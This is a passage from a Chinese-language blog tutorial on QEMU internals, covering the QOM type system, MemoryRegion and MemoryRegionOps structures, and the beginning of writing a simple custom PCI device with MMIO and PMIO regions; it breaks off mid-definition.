<code>include/qom/object.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * TypeInfo:</span><br><span class="hljs-comment"> * @name: 类型名.</span><br><span class="hljs-comment"> * @parent: 父类型名.</span><br><span class="hljs-comment"> * @instance_size: 对象大小 (#Object 的衍生物). </span><br><span class="hljs-comment"> *   若 @instance_size 为 0, 则对象的大小为其父类的大小</span><br><span class="hljs-comment"> * @instance_init: 该函数被调用以初始化对象（译注：构造函数）. </span><br><span class="hljs-comment"> *   （译注：调用前）父类已被初始化，因此子类只需要初始化他自己的成员。</span><br><span class="hljs-comment"> * @instance_post_init: 该函数被调用以结束一个对象的初始化，</span><br><span class="hljs-comment"> *   在所有的 @instance_init 函数被调用之后.</span><br><span class="hljs-comment"> * @instance_finalize: 该函数在对象被析构时调用. 其在</span><br><span class="hljs-comment"> *   父类的 @instance_finalize 被调用之前被调用.</span><br><span class="hljs-comment"> *   在该函数中一个对象应当仅释放该对象特有的成员。</span><br><span class="hljs-comment"> * @abstract: 若该域为真，则该类为一个虚类，不能被直接实例化。</span><br><span class="hljs-comment"> * @class_size: 这个对象的类对象的大小 (#Object 的衍生物)</span><br><span class="hljs-comment"> *   若 @class_size 为 0, 则类的大小为其父类的大小。</span><br><span class="hljs-comment"> *   这允许一个类型在没有添加额外的虚函数时避免实现一个显式的类型。</span><br><span class="hljs-comment"> * @class_init: 该函数在所有父类初始化结束后被调用，</span><br><span class="hljs-comment"> *   以允许一个类设置他的默认虚方法指针.</span><br><span class="hljs-comment"> *   这也允许该函数重写父类的虚方法。</span><br><span class="hljs-comment"> * @class_base_init: 在所有的父类被初始化后、但</span><br><span class="hljs-comment"> *   在类自身初始化前，为所有的基类调用该函数。</span><br><span class="hljs-comment"> *   该函数用以撤销从父类 memcpy 到子类的影响.</span><br><span class="hljs-comment"> * @class_data: 传递给 @class_init 与 @class_base_init 的数据,</span><br><span class="hljs-comment"> *   这会在建立动态类型时有用。</span><br><span class="hljs-comment"> * @interfaces: 与这个类型相关的接口. </span><br><span class="hljs-comment"> *   其应当指向一个以 0 填充元素结尾的静态数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TypeInfo</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *parent;<br><br>    <span class="hljs-type">size_t</span> instance_size;<br>    <span class="hljs-type">void</span> (*instance_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_post_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_finalize)(Object *obj);<br><br>    <span class="hljs-type">bool</span> abstract;<br>    <span class="hljs-type">size_t</span> class_size;<br><br>    <span class="hljs-type">void</span> (*class_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*class_base_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> *class_data;<br><br>    InterfaceInfo *interfaces;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在 Qemu 中要定义一个「类」的时候，我们实际上需要定义一个 TypeInfo 类型的变量，例如下面就是一个在 Qemu 定义一个自定义类的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> a3_register_types(<span class="hljs-type">void</span>) &#123;<br>    type_register_static(&amp;a3_type_info);<br>&#125;<br><br>type_init(a3_register_types);<br></code></pre></td></tr></table></figure><p><code>type_init()</code> 其实就是 <code>constructor</code> 这一 gcc attribute 的封装，其作用就是将一个函数加入到一个 <code>init_array</code> 当中，在 Qemu 程序启动时在进入到 main 函数之前会先调用 <code>init_array</code> 中的函数，因此这里会调用我们自定义的函数，其作用便是调用 <code>type_register_static()</code> 将我们自定义的类型 <code>a3_type_info</code> 注册到全局的类型表中</p><h3 id="II、Class-类的静态内容">II、Class - 类的静态内容</h3><p>当我们通过一个 <code>TypeInfo</code> 结构体定义了一个类之后，我们还需要定义一个 Class 结构体来定义这个类的静态内容，包括函数表、静态成员等，其应当继承于对应的 Class 结构体类型，例如我们若是要定义一个新的机器类，则其 Class 应当继承于 <code>MachineClass</code></p><p>所有 Class 结构体类型的最终的父类都是 <code>ObjectClass</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ObjectClass:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有类的基类.  #ObjectClass 仅包含一个整型类型 handler</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ObjectClass</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Type type;<br>    GSList *interfaces;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];<br><br>    ObjectUnparent *unparent;<br><br>    GHashTable *properties;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是一个最简单的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Class</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成 Class 的定义之后我们还应当在前面定义的 <code>a3_type_info</code> 中添加上 Class size 与 Class 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    <span class="hljs-comment">// 这里的 oc 参数便是新创建的 Class，全局只有一个该实例</span><br>    <span class="hljs-comment">// 我们应当 cast 为我们自己的 Class 类型，之后再进行相应操作</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III、Object-类的实例对象">III、Object - 类的实例对象</h3><p>我们还需要定义一个相应的 Object 类型来表示一个实例对象，其包含有这个类实际的具体数据，且应当继承于对应的 Object 结构体类型，例如我们若是要定义一个新的机器类型，其实例类型应当继承自 <code>MachineState</code></p><p>所有 Object 结构体类型的最终的父类都是 <code>Object</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Object:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有对象的基类。该对象的第一个成员为一个指向 #ObjectClass 的指针。</span><br><span class="hljs-comment"> * 因为 C 中将一个结构体的第一个成员组织在该结构体的 0 字节起始处，</span><br><span class="hljs-comment"> * 只要任何的子类将其父类作为第一个成员，我们都能直接转化为一个 #Object.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 因此, #Object 包含一个对对象类的引用作为其第一个成员。 </span><br><span class="hljs-comment"> * 这允许在运行时识别对象的真实类型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass *<span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br>    ObjectFree *<span class="hljs-built_in">free</span>;<br>    GHashTable *properties;<br>    <span class="hljs-type">uint32_t</span> ref;<br>    Object *parent;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Object parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成 Object 的定义之后我们还应当在前面定义的 <code>a3_type_info</code> 中添加上 Object size 与 Object 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_object_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// 这里的 obj 参数便是动态创建的类型实例</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .instance_init = a3_object_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3Object),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV、类的创建与释放">IV、类的创建与释放</h3><p>类似于在 C++ 当中使用 <code>new</code> 与 <code>delete</code> 来创建与释放一个类实例，在 QOM 中我们应当使用 <code>object_new()</code> 与 <code>object_delete()</code> 来创建与销毁一个 QOM 类实例，本质上就是 <code>分配/释放类空间 + 显示调用构造/析构函数</code></p><p>QOM 判断创建类实例的类型是通过类的名字，即 <code>TypeInfo-&gt;name</code>，当创建类实例时 Qemu 会遍历所有的 TypeInfo 并寻找名字匹配的那个，从而调用到对应的构造函数，并将其基类 <code>Object-&gt;class</code> 指向对应的 class</p><p>下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// create a QOM object</span><br>A3Object *a3obj = object_new(<span class="hljs-string">&quot;a3_type&quot;</span>);<br><span class="hljs-comment">// delete a QOM object</span><br>object_delete(a3obj);<br></code></pre></td></tr></table></figure><h2 id="二、MemoryRegion-Qemu-中的一块内存区域">二、MemoryRegion - Qemu 中的一块内存区域</h2><p>在 Qemu 当中使用 <code>MemoryRegion</code> 结构体类型来表示一块具体的 Guest 物理内存区域，该结构体定义于 <code>include/exec/memory.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** MemoryRegion:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 表示一块内存区域的一个结构体.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegion</span> &#123;</span><br>    Object parent_obj;<br><br>    <span class="hljs-comment">/* private: */</span><br><br>    <span class="hljs-comment">/* The following fields should fit in a cache line */</span><br>    <span class="hljs-type">bool</span> romd_mode;<br>    <span class="hljs-type">bool</span> ram;<br>    <span class="hljs-type">bool</span> subpage;<br>    <span class="hljs-type">bool</span> readonly; <span class="hljs-comment">/* For RAM regions */</span><br>    <span class="hljs-type">bool</span> nonvolatile;<br>    <span class="hljs-type">bool</span> rom_device;<br>    <span class="hljs-type">bool</span> flush_coalesced_mmio;<br>    <span class="hljs-type">bool</span> global_locking;<br>    <span class="hljs-type">uint8_t</span> dirty_log_mask;<br>    <span class="hljs-type">bool</span> is_iommu;<br>    RAMBlock *ram_block;<br>    Object *owner;<br><br>    <span class="hljs-type">const</span> MemoryRegionOps *ops;<br>    <span class="hljs-type">void</span> *opaque;<br>    MemoryRegion *container;<span class="hljs-comment">// 指向父 MemoryRegion</span><br>    Int128 size;<span class="hljs-comment">// 内存区域大小</span><br>    hwaddr addr;<span class="hljs-comment">// 在父 MR 中的偏移量</span><br>    <span class="hljs-type">void</span> (*destructor)(MemoryRegion *mr);<br>    <span class="hljs-type">uint64_t</span> align;<br>    <span class="hljs-type">bool</span> terminates;<br>    <span class="hljs-type">bool</span> ram_device;<br>    <span class="hljs-type">bool</span> enabled;<br>    <span class="hljs-type">bool</span> warning_printed; <span class="hljs-comment">/* For reservations */</span><br>    <span class="hljs-type">uint8_t</span> vga_logging_count;<br>    MemoryRegion *alias;<span class="hljs-comment">// 仅在 alias MR 中，指向实际的 MR</span><br>    hwaddr alias_offset;<br>    <span class="hljs-type">int32_t</span> priority;<br>    QTAILQ_HEAD(, MemoryRegion) subregions;<br>    QTAILQ_ENTRY(MemoryRegion) subregions_link;<br>    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">unsigned</span> ioeventfd_nb;<br>    MemoryRegionIoeventfd *ioeventfds;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 Qemu 当中有三种类型的 MemoryRegion：</p><ul><li>MemoryRegion 根：通过 <code>memory_region_init()</code> 进行初始化，其用以表示与管理由多个 sub-MemoryRegion 组成的一个内存区域，并不实际指向一块内存区域，例如 <code>system_memory</code></li><li>MemoryRegion 实体：通过 <code>memory_region_init_ram()</code> 初始化，表示具体的一块大小为 size 的内存空间，指向一块具体的内存</li><li>MemoryRegion 别名：通过 <code>memory_region_init_alias()</code> 初始化，作为另一个 MemoryRegion 实体的别名而存在，不指向一块实际内存</li></ul><p>MR 容器与 MR 实体间构成树形结构，其中容器为根节点而实体为子节点：</p><blockquote><p>下图来自于<a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-as/02-memoryregion">这里</a></p></blockquote><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                       struct MemoryRegion<br>                       +------------------------+                                         <br>                       |<span class="hljs-string">name                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                                  </span>|<br>                                  |<span class="hljs-string"></span><br><span class="hljs-string">          ----+-------------------+---------------------+----</span><br><span class="hljs-string">              </span>|<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br><br>struct MemoryRegion                            struct MemoryRegion<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">name                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">name                    </span>|<br>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (const char *)        </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">addr                    </span>|<br>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (hwaddr)              </span>|<br>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">size                    </span>|<br>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (Int128)              </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">subregions              </span>|<br>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<br>+------------------------+                     +------------------------+<br></code></pre></td></tr></table></figure><p>相应地，基于 OOP 的思想，MemoryRegion 的成员函数被封装在函数表 <code>MemoryRegionOps</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Memory region callbacks</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegionOps</span> &#123;</span><br>    <span class="hljs-comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span><br>    <span class="hljs-type">uint64_t</span> (*read)(<span class="hljs-type">void</span> *opaque,<br>                     hwaddr addr,<br>                     <span class="hljs-type">unsigned</span> size);<br>    <span class="hljs-comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span><br>    <span class="hljs-type">void</span> (*write)(<span class="hljs-type">void</span> *opaque,<br>                  hwaddr addr,<br>                  <span class="hljs-type">uint64_t</span> data,<br>                  <span class="hljs-type">unsigned</span> size);<br><br>    MemTxResult (*read_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                   hwaddr addr,<br>                                   <span class="hljs-type">uint64_t</span> *data,<br>                                   <span class="hljs-type">unsigned</span> size,<br>                                   MemTxAttrs attrs);<br>    MemTxResult (*write_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                    hwaddr addr,<br>                                    <span class="hljs-type">uint64_t</span> data,<br>                                    <span class="hljs-type">unsigned</span> size,<br>                                    MemTxAttrs attrs);<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">device_endian</span> <span class="hljs-title">endianness</span>;</span><br>    <span class="hljs-comment">/* Guest可见约束: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span><br><span class="hljs-comment">         * accesses throw machine checks.</span><br><span class="hljs-comment">         */</span><br>         <span class="hljs-type">bool</span> unaligned;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 若存在且 #false, 则该事务不会被设备所接受</span><br><span class="hljs-comment">         * (并导致机器的相关行为，例如机器检查异常).</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> (*accepts)(<span class="hljs-type">void</span> *opaque, hwaddr addr,<br>                        <span class="hljs-type">unsigned</span> size, <span class="hljs-type">bool</span> is_write,<br>                        MemTxAttrs attrs);<br>    &#125; valid;<br>    <span class="hljs-comment">/* 内部应用约束: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* 若非 0，则决定了最小的实现的 size .</span><br><span class="hljs-comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-comment">/* 若非 0，则决定了最大的实现的 size . </span><br><span class="hljs-comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* 若为 true, 支持非对齐的访问.  </span><br><span class="hljs-comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> unaligned;<br>    &#125; impl;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们的 Guest 要读写虚拟机上的内存时，在 Qemu 内部实际上会调用 <code>address_space_rw()</code>，对于一般的 RAM 内存而言则直接对 MR 对应的内存进行操作，对于 MMIO 而言则最终调用到对应的 <code>MR-&gt;ops-&gt;read()</code> 或 <code>MR-&gt;ops-&gt;write()</code></p><p>关于 Qemu 内存管理更多的内容就暂且不在此展开了，不过现在我们知道的是在 Qemu 中使用 <code>MemoryRegion</code> 结构体来表示一段内存区域，<strong>那么我们同样可以通过在设备中添加 MemoryRegion 的方式来为设备添加内存，从而实现与设备间的 MMIO 通信</strong></p><p>同样的，为了统一接口，在 Qemu 当中 <strong>PMIO 的实现同样是通过 MemoryRegion 来完成的</strong></p><h2 id="三、Qemu-中-PCI-设备的编写">三、Qemu 中 PCI 设备的编写</h2><p>在补充了这么多的 Qemu 相关的知识之后，现在我们可以开始在 Qemu 中编写 PCI 设备了，这里笔者将编写一个最简单的 Qemu 设备，并将源码放在 <code>hw/misc/a3dev.c</code> 中</p><p>Qemu 当中 PCI 设备实例的基类是 <code>PCIDevice</code>，因此我们应当创建一个继承自 <code>PCIDevice</code> 的类来表示我们的设备实例，这里笔者仅声明了两个 <code>MemoryRegion</code> 用作 MMIO 与 PMIO，以及一个用作数据存储的 buffer：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_BUF_SIZE 0x100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint8_t</span> buf[A3DEV_BUF_SIZE];<br>&#125; A3PCIDevState;<br></code></pre></td></tr></table></figure><p>以及定义一个空的 Class 模板，继承自 PCI 设备的静态类型 <code>PCIDeviceClass</code>，不过这一步并不是必须的，事实上我们可以直接用 <code>PCIDeviceClass</code> 作为我们设备类的 Class：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> 